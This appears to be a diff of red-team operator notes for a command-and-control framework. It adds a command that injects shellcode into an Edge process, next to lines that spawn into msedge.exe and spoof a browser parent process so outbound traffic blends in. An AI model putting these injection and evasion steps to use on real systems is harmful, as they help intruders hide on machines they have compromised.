@@ -9,10 +9,10 @@ For any outbound connection commands find an msedge or chrome ppid change the sp
 Find msedge process and inject shell code into it via GUI
 
 ```powershell
+inject 6424 x64 http
 spawnto x64 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'
 powerpick command
 ```
-
 
 #### TCP-Local (enum)
 
